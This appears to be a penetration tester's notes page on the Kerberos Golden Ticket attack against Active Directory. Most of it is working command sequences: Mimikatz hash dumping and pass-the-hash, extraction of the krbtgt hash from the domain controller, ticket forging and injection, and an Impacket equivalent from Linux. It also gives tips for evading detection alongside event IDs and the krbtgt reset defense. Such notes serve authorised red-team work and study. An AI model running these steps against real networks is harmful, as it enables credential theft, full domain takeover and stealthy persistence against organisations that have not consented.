---
title: Golden Ticket
draft: false
tags:
  - windows
  - active-directory
  - recon
  - info-gathering
  - active
---
 
Generate a TGT, escalate privileges and obtain DC access.

> [!Requirements]
> Access to a Domain Admins group account or have compromised the domain controller itself.

1. Extract administrator NTLM hash (must be domain admin) and access the DC:
```powershell
PS> powershell -ep bypass
PS> . .\Invoke-Mimikatz.ps1

+ EXTRACT ADMIN NTLM HASH +
PS> dir \\DC_FQDN/c$ (verify if we can access the DC -> we shouldnt)
PS> Invoke-Mimkatz -Command '"privilege::debug" "sekurlsa::logonpasswords"' (extract the NTLM hash of the users that are loged in)
*copy the NTLM hash for the user administrator*
84398159ce4d01cfe10cf34d5dae3909
```

2. Execute PtH attack
```powershell
PS> Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:DOMAIN_FQDN /ntlm:ADMIN_NTLM_HASH /run:powershell.exe"' (perform the PtH attack to obtain domain admin privileges)
```

3. Retrieve KRBTGT account hash (krbtgt is the service account that issues/encrypts TGTs):
```powershell
PS [domain admin session]> powershell -ep bypass
PS [domain admin session]> . .\Invoke-Mimikatz.ps1
PS [domain admin session]> Invoke-Mimikatz -Command '"privilege::debug; lsadump::lsa /patch"' -ComputerName DC_FQDN (dump LSA secrets on the DC and patch the process to allow exporting secrets)
*copy the KRBTGT NTLM hash*
0e3cab3ba66afddb664025d96a8dc4d2
```

> [!Info]
> Delete any kerberos tickets using `mimikatz # kerberos::purge`

4. Generate and implement a golden ticket
```powershell
PS> Invoke-Mimikatz -Command '"kerberos::golden /user:DOMAIN_USER /domain:DOMAIN_FQDN /sid:DOMAIN_SID /krbtgt:KRBTGT_NTLM id:500 /groups:512 /startoffset:0 /ending:600 /renewmax:10080 /ptt"'
Parameters:
user: user for whom the ticket is generated
domain: domain
sid: SID of the domain
krbtgt: ntlm hash of the krbtgt account
id: user rid (admin standard: 500) (optional)
group: user group membership (admin standard: 512) (optional)
startoffset: ticket valid time (optional)
ending: expiration time (optional)
renewmax: maximum renewable time (optional)
ptt: injects the ticket into the current PSH session

PS> klist (check if we have created the golden ticket)
```

> [!Note]
> Creating a golden ticket and injecting it into memory doesnt require administrative privileges and can be performed from a non-joined domain host.

5. Access to DC
```powershell
mimikatz # misc::cmd (spawn a CMD)
C:\> PsExec.exe \\DC_HOSTNAME cmd.exe # spawn a cmd on the DC
C:\> whoami /groups # verify that we are part of the domain admins group


PS> dir \\DC_FQDN\c$
```

> [!Note]
> By accessing the DC using the IP address, we would be forced to use the NTLM authentication and access wont be granted:
> `$ psexec.exe \\DC_IP cmd.exe`

---

# From Linux (Impacket)

Alternativa recomendada cuando operamos desde un host Linux. Requiere haber obtenido previamente el hash NTLM del account `krbtgt` (vía [[AD DCSync]] o [[Shadow Copies]]).

```bash
# 1. Obtener el hash NTLM del krbtgt (si no lo tenemos ya):
$ impacket-secretsdump DOMAIN_FQDN/Administrator@DC_IP -hashes :ADMIN_NTLM_HASH

# 2. Obtener el Domain SID:
$ impacket-getPac -targetUser Administrator DOMAIN_FQDN/Administrator:PASSWORD
# o con lookupsid:
$ impacket-lookupsid DOMAIN_FQDN/user:password@DC_IP | grep "Domain SID"

# 3. Generar el Golden Ticket:
$ impacket-ticketer -nthash KRBTGT_NTLM_HASH \
    -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
    -domain DOMAIN_FQDN \
    -user-id 500 \
    Administrator

# Esto genera un archivo Administrator.ccache

# 4. Exportar el ticket y usarlo:
$ export KRB5CCNAME=Administrator.ccache

# 5. Acceder al DC con el ticket forjado:
$ impacket-psexec -k -no-pass DOMAIN_FQDN/Administrator@DC_FQDN
$ impacket-wmiexec -k -no-pass DOMAIN_FQDN/Administrator@DC_FQDN
$ impacket-smbclient -k -no-pass DOMAIN_FQDN/Administrator@DC_FQDN
```

> [!Note]
> Usar siempre el **FQDN** del DC (no la IP) cuando se usa autenticación Kerberos. Si es necesario, ajustar `/etc/hosts` para que el FQDN resuelva a la IP correcta.
> Configurar `/etc/krb5.conf` si hay problemas de autenticación (ver [[Silver Ticket]] para un ejemplo completo).

---

# Opsec y Detección

> [!Warning]
> **Detección**: Microsoft introdujo protecciones específicas contra Golden Tickets. Los indicadores incluyen:
> - **Event ID 4769** — Kerberos Service Ticket Request con flags inusuales
> - **Event ID 4672** — Special logon con privilegios de DA sin logon previo correspondiente
> - Tickets con `startoffset` o `renewmax` fuera de los valores por defecto del dominio
> - Uso de cuentas que no existen en el dominio (Golden Ticket permite especificar cualquier username)

**Medidas para reducir la detección**:
- Usar los mismos valores de tiempo que los tickets legítimos del dominio (`/startoffset:0 /ending:600 /renewmax:10080`)
- Especificar un usuario que exista realmente en el dominio
- Evitar reutilizar el mismo ticket en múltiples sistemas en poco tiempo

**Defensa**: La única forma de invalidar todos los Golden Tickets existentes es **cambiar la contraseña de krbtgt dos veces** (el hash anterior y el actual son válidos simultáneamente durante un breve período).

---

# Notas relacionadas

- [[AD DCSync]] — forma principal de obtener el hash NTLM del krbtgt
- [[Shadow Copies]] — alternativa para extraer el hash krbtgt desde el NTDS.dit
- [[Pass the Hash (PtH)]] — técnica previa frecuente para obtener acceso de DA
- [[Pass the Ticket (PtT)]] — uso de tickets Kerberos legítimos (sin forjarlos)
- [[Silver Ticket]] — variante que forja TGS en vez de TGT (menor ruido, acceso más limitado)
- [[Kerberoasting]] — obtención de hashes de cuentas de servicio (distinto al krbtgt)
